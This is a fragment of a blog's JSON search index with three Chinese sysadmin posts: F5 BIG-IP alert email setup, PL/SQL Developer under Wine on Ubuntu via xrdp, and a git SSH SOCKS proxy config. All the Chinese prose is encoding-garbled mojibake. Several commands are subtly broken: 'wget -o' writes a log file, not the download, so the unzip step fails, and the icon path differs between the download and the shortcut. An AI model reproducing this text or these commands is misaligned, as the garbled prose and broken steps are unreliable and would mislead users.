class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emailhub\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e192.168.0.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å¦‚æœæ²¡æœ‰å®‰è£…å†…ç½‘çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œå¯ä»¥åœ¨è¿™é‡Œè®¾ç½®ã€‚å®‰è£…äº†å°±ä¸ç”¨è®¾\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eFromLineOverride\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eYES  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUseTLS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAuthUser\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esmtp_account  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAuthPass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003epassword  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè®¾ç½®å‘Šè­¦å†…å®¹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ealert BIGIP_MCPD_MCPDERR_POOL_MEMBER_MON_DOWN \u003cspan class=\"s2\"\u003e\u0026#34;Pool (.*?) member (.*?):(.*?) monitor status down.\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        email \u003cspan class=\"nv\"\u003etoaddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;user01@company.com,user02@company.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003efromaddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;monit@company.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ebody\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;A pool member went down\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ealert BIGIP_MCPD_MCPDERR_POOL_MEMBER_MON_UP \u003cspan class=\"s2\"\u003e\u0026#34;Pool (.*?) member (.*?):(.*?) monitor status up.\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        email \u003cspan class=\"nv\"\u003etoaddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;user01@company.com,user02@company.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003efromaddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;monit@company.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ebody\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;A pool member went up\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eokï¼Œæå®šã€‚ä¸ç”¨é‡å¯ä»€ä¹ˆçš„å•Šï¼Œå³æ—¶ç”Ÿæ•ˆã€‚\u003c/p\u003e","title":"F5-bigipçš„Load balanceå‘Šè­¦é‚®ä»¶è®¾ç½®"},{"content":"è¿™çœŸæ˜¯ä¸ªæ— æ¯”å¤æ€ªçš„å®¡è®¡éœ€æ±‚ï¼Œéœ€è¦è®©ä¸€äº›åŒäº‹èƒ½è®¿é—®oracleï¼Œä½†æ˜¯ä¸å…è®¸ä»–ä»¬é€šè¿‡å‰ªåˆ‡æ¿æ‹·è´æ•°æ®ã€‚\nè¿™åªèƒ½æ˜¯kvm+Ubuntu+xrdp+wine+plsqlæ¥å®ç°äº†ï¼ˆCentOSåº”è¯¥ä¹Ÿæ²¡é—®é¢˜ï¼‰\né¦–å…ˆå‡†å¤‡ubuntuçš„isoï¼Œé€‰ç²¾ç®€çš„serverç‰ˆï¼Œæ¡Œé¢æ‰‹åŠ¨è£…ï¼š\nwget http://mirrors.163.com/ubuntu-releases/12.04/ubuntu-12.04.5-server-i386.iso ç”Ÿæˆkvmè™šæœºç£ç›˜ï¼š\nqemu-img create -f qcow2 /home/kvm/ubuntu.qcow2 20G å®‰è£…kvmè™šæœºï¼š\nvirt-install \\ --name=ubuntu \\ --vcpu=1 \\ --ram=2048 \\ --disk path=/home/kvm/ubuntu.qcow2,format=qcow2,size=20 \\ --cdrom=/home/kvm/ubuntu-12.04.5-server-i386.iso \\ --os-type=linux \\ --network bridge=br0 \\ --vnc --vnclisten=0.0.0.0 --vncport=5901 è¿™æ—¶å€™å°±è¦è¿åˆ°å®æœºçš„vnc 5901ç«¯å£ï¼Œå¼€å§‹å®‰è£…ã€‚åæ­£æ˜¯åªè¦ç”¨plsqlçš„ï¼Œæ‰€ä»¥ç¼ºçœéƒ½å¯ã€‚è®°ä½è¦è£…ä¸Šsshd serverï¼Œä¾¿äºè¿œç¨‹ç®¡ç†ã€‚\nè£…ubuntuæ—¶ä¼šæç¤ºç”Ÿæˆä¸€ä¸ªérootç”¨æˆ·ï¼Œå°±å«plsqlå¥½äº†ã€‚\nå®‰è£…ä¸è¡¨ï¼Œå®‰è£…å¥½äº†ä»¥åå› ä¸ºè£…äº†sshdï¼Œæ‰€ä»¥å°±å¯ä»¥sshè¿œç¨‹æ“ä½œäº†ã€‚\nå®‰è£…wineï¼š\nsudo apt-get install software-properties-common sudo add-apt-repository ppa:ubuntu-wine/ppa sudo apt-get update sudo apt-get install wine å®‰è£…xrdpå’Œgnome-shellä»¥åŠè¾“å…¥æ³•ï¼š\nsudo apt-get install xrdp sudo apt-get install gnome-shell sudo apt-get install ibus sudo apt-get install fcitx-table-wbpy è®¾ç½®xrdpç”±gnome-sessionæ§åˆ¶ï¼š\n#vi /etc/xrdp/startwm.sh ... #åŠ ä¸€è¡Œï¼Œç”¨gnome-sessionæ§åˆ¶ echo \u0026#34;gnome-session --session=gnome-classic\u0026#34; \u0026gt; .xsession . /etc/X11/Xsession ... è®¾ç½®xrdpçš„ç™»å½•ï¼Œå»æ‰å…¶å®ƒä¸éœ€è¦çš„ç™»å½•æ–¹å¼ï¼Œåªç•™ä¸€ç§å¹¶æ”¹åï¼š\n# vi /etc/xrdp/xrdp.ini [globals] bitmap_cache=yes bitmap_compression=yes port=3389 crypt_level=low channel_code=1 [xrdp1] name=plsql server lib=libvnc.so username=ask password=ask ip=127.0.0.1 port=-1 ok, å…ˆè¿è¡Œä¸€ä¸‹wineï¼Œç”Ÿæˆç›®å½•ç»“æ„ä»¥åŠæ³¨å†Œè¡¨æ–‡ä»¶\nwine regedit åœ¨sshç»ˆç«¯è¿è¡Œä»¥ä¸Šçš„å‘½ä»¤ä¼šé€€å‡ºï¼Œä¸è¦ç´§ï¼Œé€€å‡ºæ—¶å…¶å®ç›®å½•ç»“æ„å’Œæ³¨å†Œè¡¨æ–‡ä»¶å·²ç»ç”Ÿæˆå¥½äº†ã€‚\næˆ‘ä»¬ç¼–è¾‘ä¸€ä¸‹æ³¨å†Œè¡¨ï¼Œæ”¹åŠ¨ä¸€ä¸‹PATHå¹¶ä¸”æ·»åŠ 2ä¸ªç¯å¢ƒå˜é‡ï¼š\nvi ~/.wine/system.reg ... [System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment] 1464861672 \u0026#34;ComSpec\u0026#34;=str(2):\u0026#34;C:\\\\windows\\\\system32\\\\cmd.exe\u0026#34; \u0026#34;NUMBER_OF_PROCESSORS\u0026#34;=\u0026#34;1\u0026#34; \u0026#34;ORACLE_HOME\u0026#34;=\u0026#34;c:\\\\oracle\u0026#34; \u0026#34;OS\u0026#34;=\u0026#34;Windows_NT\u0026#34; \u0026#34;PATH\u0026#34;=str(2):\u0026#34;c:\\\\oracle\\\\bin;C:\\\\windows\\\\system32;C:\\\\windows;C:\\\\windows\\\\system32\\\\wbem\u0026#34; \u0026#34;PATHEXT\u0026#34;=\u0026#34;.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH\u0026#34; \u0026#34;PROCESSOR_ARCHITECTURE\u0026#34;=\u0026#34;x86\u0026#34; \u0026#34;PROCESSOR_IDENTIFIER\u0026#34;=\u0026#34;x86 Family 6 Model 13 Stepping 3, GenuineIntel\u0026#34; \u0026#34;PROCESSOR_LEVEL\u0026#34;=\u0026#34;6\u0026#34; \u0026#34;PROCESSOR_REVISION\u0026#34;=\u0026#34;0d03\u0026#34; \u0026#34;SystemDrive\u0026#34;=\u0026#34;c:\u0026#34; \u0026#34;SYSTEMROOT\u0026#34;=\u0026#34;C:\\\\windows\u0026#34; \u0026#34;TEMP\u0026#34;=str(2):\u0026#34;C:\\\\windows\\\\temp\u0026#34; \u0026#34;TMP\u0026#34;=str(2):\u0026#34;C:\\\\windows\\\\temp\u0026#34; \u0026#34;TNS_ADMIN\u0026#34;=\u0026#34;c:\\\\oracle\\\\network\\\\admin\u0026#34; \u0026#34;windir\u0026#34;=str(2):\u0026#34;C:\\\\windows\u0026#34; \u0026#34;winsysdir\u0026#34;=\u0026#34;C:\\\\windows\\\\system32\u0026#34; ... æ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸¤è¡ŒTNSADMINå’ŒORACLE_HOMEï¼Œå¹¶ä¿®æ”¹äº†PATHï¼Œæ€»å…±ä¸‰ä¸ªåœ°æ–¹ã€‚\næˆ‘ä»¬å†ä¸‹è½½oracleçš„å®¢æˆ·ç«¯ï¼Œbasicçš„å³å¯ï¼Œå¹¶è§£å‹åˆ°æŒ‡å®šåœ°æ–¹ï¼š\nmkdir -p ~/.wine/drive_c/oracle/network/admin wget http://eservice.yru.ac.th/d/instantclient-basic-nt-11.2.0.4.0.zip -o /tmp/instantclient-basic-nt-11.2.0.4.0.zip cd ~/.wine/drive_c/oracle unzip -x /tmp/instantclient-basic-nt-11.2.0.4.0.zip mv instantclient_11_2 bin okï¼Œå¤§ç¯å¢ƒå°±å‡†å¤‡å¥½äº†ã€‚\nä¸‹è½½plsql\nmkdir ~/Desktop #ä¸‹å¥½plsqldev904.exe mv plsqldev904.exe ~/Desktop wget http://www.rendoumi.com/soft/plsql.icon -o /etc/plsq.icon ç„¶åç”¨è¿œç¨‹æ¡Œé¢ç™»å½•è¿™å°æœºå™¨ ç›´æ¥ä¼šçœ‹åˆ°æ¡Œé¢ä¸Šæœ‰ä¸ªexe åŒå‡»æ‰§è¡Œï¼Œå°±å¼€å§‹å®‰è£…äº† ç„¶åI Agreeï¼Œéƒ½æŒ‰ç¼ºçœçš„å®‰è£…å³å¯ è£…å®Œåï¼Œå°±ç›´æ¥æŠŠè¿™ä¸ªplsql.exeåˆ é™¤å³å¯\nç„¶åç”Ÿæˆä¸ªæ¡Œé¢å¿«æ·æ–¹å¼ï¼š\n# vi ~/Desktop/PLSQL\\ Developer.desktop [Desktop Entry] Name=PLSQL Developer Exec=wine \u0026#34;/home/plsql/.wine/dosdevices/c:/Program Files/PLSQL Developer/plsqldev.exe\u0026#34; Path=/home/plsql/.wine/dosdevices/c:/Program Files/PLSQL Developer Icon=/etc/plsql.icon Type=Application Categories=Wine; è¿™æ—¶å€™å›åˆ°è¿œç¨‹æ¡Œé¢ï¼Œå·²ç»å¯ä»¥çœ‹åˆ°æ¡Œé¢ä¸Šå¤šäº†ä¸ªç™½è‰²çš„ä¸œè¥¿ï¼š å³é”®ç‚¹å‡»ï¼Œæ‰“å¼€Propertiesï¼š æŠŠAllow executing file as programç»™å‹¾ä½ï¼Œå›¾è¡¨ä¹Ÿæ˜¾ç¤ºå‡ºæ¥äº† okï¼Œå¼„å¥½äº†ï¼Œæœ€åè¿è¡Œå³å¯ï¼Œæ˜¯å¯ä»¥è¾“å…¥æ±‰å­—çš„ï¼š\næœ€åè¡¥å……ä¸€ä¸‹ï¼Œtnsnames.oraæ˜¯æ”¾åœ¨ä¸‹é¢è¿™ä¸ªç›®å½•ä¸‹çš„ï¼š\n~/.wine/drive_c/oracle/network/admin ","permalink":"https://rendoumi.com/posts/20240118-plsql_linux/","summary":"\u003cp\u003eè¿™çœŸæ˜¯ä¸ªæ— æ¯”å¤æ€ªçš„å®¡è®¡éœ€æ±‚ï¼Œéœ€è¦è®©ä¸€äº›åŒäº‹èƒ½è®¿é—®oracleï¼Œä½†æ˜¯ä¸å…è®¸ä»–ä»¬é€šè¿‡å‰ªåˆ‡æ¿æ‹·è´æ•°æ®ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™åªèƒ½æ˜¯kvm+Ubuntu+xrdp+wine+plsqlæ¥å®ç°äº†ï¼ˆCentOSåº”è¯¥ä¹Ÿæ²¡é—®é¢˜ï¼‰\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå‡†å¤‡ubuntuçš„isoï¼Œé€‰ç²¾ç®€çš„serverç‰ˆï¼Œæ¡Œé¢æ‰‹åŠ¨è£…ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://mirrors.163.com/ubuntu-releases/12.04/ubuntu-12.04.5-server-i386.iso  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç”Ÿæˆkvmè™šæœºç£ç›˜ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eqemu-img create -f qcow2 /home/kvm/ubuntu.qcow2 20G  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®‰è£…kvmè™šæœºï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-install \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    --name\u003cspan class=\"o\"\u003e=\u003c/span\u003eubuntu \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --vcpu\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --ram\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2048\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --disk \u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/home/kvm/ubuntu.qcow2,format\u003cspan class=\"o\"\u003e=\u003c/span\u003eqcow2,size\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e20\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --cdrom\u003cspan class=\"o\"\u003e=\u003c/span\u003e/home/kvm/ubuntu-12.04.5-server-i386.iso \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --os-type\u003cspan class=\"o\"\u003e=\u003c/span\u003elinux  \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e    --vnc --vnclisten\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0 --vncport\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5901\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ—¶å€™å°±è¦è¿åˆ°å®æœºçš„vnc 5901ç«¯å£ï¼Œå¼€å§‹å®‰è£…ã€‚åæ­£æ˜¯åªè¦ç”¨plsqlçš„ï¼Œæ‰€ä»¥ç¼ºçœéƒ½å¯ã€‚è®°ä½è¦è£…ä¸Šsshd serverï¼Œä¾¿äºè¿œç¨‹ç®¡ç†ã€‚\u003c/p\u003e\n\u003cp\u003eè£…ubuntuæ—¶ä¼šæç¤ºç”Ÿæˆä¸€ä¸ªérootç”¨æˆ·ï¼Œå°±å«plsqlå¥½äº†ã€‚\u003c/p\u003e\n\u003cp\u003eå®‰è£…ä¸è¡¨ï¼Œå®‰è£…å¥½äº†ä»¥åå› ä¸ºè£…äº†sshdï¼Œæ‰€ä»¥å°±å¯ä»¥sshè¿œç¨‹æ“ä½œäº†ã€‚\u003c/p\u003e\n\u003cp\u003eå®‰è£…wineï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install software-properties-common  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo add-apt-repository ppa:ubuntu-wine/ppa  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get update  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install wine  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå®‰è£…xrdpå’Œgnome-shellä»¥åŠè¾“å…¥æ³•ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install xrdp  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install gnome-shell  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install ibus  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install fcitx-table-wbpy  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè®¾ç½®xrdpç”±gnome-sessionæ§åˆ¶ï¼š\u003c/p\u003e","title":"åœ¨Ubuntuä¸Šè£…ä¸ªplsqlé€šè¿‡è¿œç¨‹æ¡Œé¢è®¿é—®oracle"},{"content":"ä¸‡ä¸‡æ²¡æƒ³åˆ°å•Šï¼Œgithubè¢«å°è½®åˆ°è‡ªå·±å¤´ä¸Šäº†ã€‚\nè¿™ä¸ªåšå®¢æ˜¯åœ¨windowsä¸‹ç”¨Typoraå†™çš„ï¼Œç„¶åhugoç”Ÿæˆï¼Œç›´æ¥ç”¨git for windowsæäº¤ï¼Œä»Šå¤©gitæ— æ³•æäº¤äº†ã€‚\nå¿…é¡»è®¾ç½®ä¸€ä¸‹git sshçš„ä»£ç†äº†ï¼Œæˆ‘ç”¨çš„æ˜¯socks5ã€‚\nåœ¨C:\\Users\\username\\.ssh\\configæ–‡ä»¶ä¸­æ·»åŠ ç›¸å…³é…ç½®ï¼Œå¦‚æœæ²¡æœ‰configæ–‡ä»¶éœ€è¦æ‰‹åŠ¨åˆ›å»ºï¼Œconnectå‘½ä»¤æ˜¯git Windowså®¢æˆ·ç«¯git for windowsè‡ªå¸¦çš„, ä½äº\u0026lt;Git-install-path\u0026gt;\\mingw64\\bin\\connect.exe\nsocksä»£ç†æ·»åŠ ä»¥ä¸‹é…ç½®\nHost github.com(æ”¹æˆä½ çš„ç«™ç‚¹) ProxyCommand connect -S 127.0.0.1:1080 %h %p å¯ä»¥é…ç½®å¤šä¸ªç½‘ç«™Host\nHost github.com(æ”¹æˆä½ çš„ç«™ç‚¹) ProxyCommand connect -S 127.0.0.1:1080 %h %p Host bitbucket.org(æ”¹æˆä½ çš„ç«™ç‚¹) ProxyCommand connect -S 127.0.0.1:1080 %h %p å¦‚æœHostè®¾ç½®ä¸º*ï¼Œä»£ç†ä¼šå¯¹æ‰€æœ‰æœªé…ç½®çš„Hostèµ·ä½œç”¨ã€‚ä»¥ä¸‹æœ‰ä¸‰é¡¹é…ç½®ï¼Œè®¿é—®githubä½¿ç”¨ç¬¬äºŒé¡¹é…ç½®ï¼Œè®¿é—®bitbucketä½¿ç”¨ç¬¬ä¸‰é¡¹é…ç½®ï¼Œå…¶å®ƒç½‘ç«™ä½¿ç”¨ç¬¬ä¸€é¡¹é…ç½®\nHost * ProxyCommand \u0026#34;C:/Program Files/Git/mingw64/bin/connect.exe\u0026#34; -H 127.0.0.1:1080 %h %p IdentityFile \u0026#34;C:/Users/bybon/.ssh/id_rsa\u0026#34; TCPKeepAlive yes IdentitiesOnly yes Host github.com ProxyCommand connect -S 127.0.0.1:1080 %h %p Host bitbucket.com ProxyCommand connect -S 127.0.0.1:1080 %h %p ","permalink":"https://rendoumi.com/posts/20240117-git_proxy/","summary":"\u003cp\u003eä¸‡ä¸‡æ²¡æƒ³åˆ°å•Šï¼Œgithubè¢«å°è½®åˆ°è‡ªå·±å¤´ä¸Šäº†ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªåšå®¢æ˜¯åœ¨windowsä¸‹ç”¨Typoraå†™çš„ï¼Œç„¶åhugoç”Ÿæˆï¼Œç›´æ¥ç”¨git for windowsæäº¤ï¼Œä»Šå¤©gitæ— æ³•æäº¤äº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240117180143368\" loading=\"lazy\" src=\"/posts/20240117-git_proxy/image-20240117180143368.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå¿…é¡»è®¾ç½®ä¸€ä¸‹git sshçš„ä»£ç†äº†ï¼Œæˆ‘ç”¨çš„æ˜¯socks5ã€‚\u003c/p\u003e\n\u003cp\u003eåœ¨\u003ccode\u003eC:\\Users\\username\\.ssh\\config\u003c/code\u003eæ–‡ä»¶ä¸­æ·»åŠ ç›¸å…³é…ç½®ï¼Œå¦‚æœæ²¡æœ‰configæ–‡ä»¶éœ€è¦æ‰‹åŠ¨åˆ›å»ºï¼Œconnectå‘½ä»¤æ˜¯git Windowså®¢æˆ·ç«¯\u003ccode\u003egit for windows\u003c/code\u003eè‡ªå¸¦çš„, ä½äº\u003ccode\u003e\u0026lt;Git-install-path\u0026gt;\\mingw64\\bin\\connect.exe\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003esocksä»£ç†æ·»åŠ ä»¥ä¸‹é…ç½®\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost github.com\u003cspan class=\"o\"\u003e(\u003c/span\u003eæ”¹æˆä½ çš„ç«™ç‚¹\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eProxyCommand connect -S 127.0.0.1:1080 %h %p\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eå¯ä»¥é…ç½®å¤šä¸ªç½‘ç«™Host\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost github.com\u003cspan class=\"o\"\u003e(\u003c/span\u003eæ”¹æˆä½ çš„ç«™ç‚¹\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eProxyCommand connect -S 127.0.0.1:1080 %h %p\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost bitbucket.org\u003cspan class=\"o\"\u003e(\u003c/span\u003eæ”¹æˆä½ çš„ç«™ç‚¹\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eProxyCommand connect -S 127.0.0.1:1080 %h %p\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚æœHostè®¾ç½®ä¸º\u003ccode\u003e*\u003c/code\u003eï¼Œä»£ç†ä¼šå¯¹æ‰€æœ‰æœªé…ç½®çš„Hostèµ·ä½œç”¨ã€‚ä»¥ä¸‹æœ‰ä¸‰é¡¹é…ç½®ï¼Œè®¿é—®githubä½¿ç”¨ç¬¬äºŒé¡¹é…ç½®ï¼Œè®¿é—®bitbucketä½¿ç”¨ç¬¬ä¸‰é¡¹é…ç½®ï¼Œå…¶å®ƒç½‘ç«™ä½¿ç”¨ç¬¬ä¸€é¡¹é…ç½®\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost *\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ProxyCommand \u003cspan class=\"s2\"\u003e\u0026#34;C:/Program 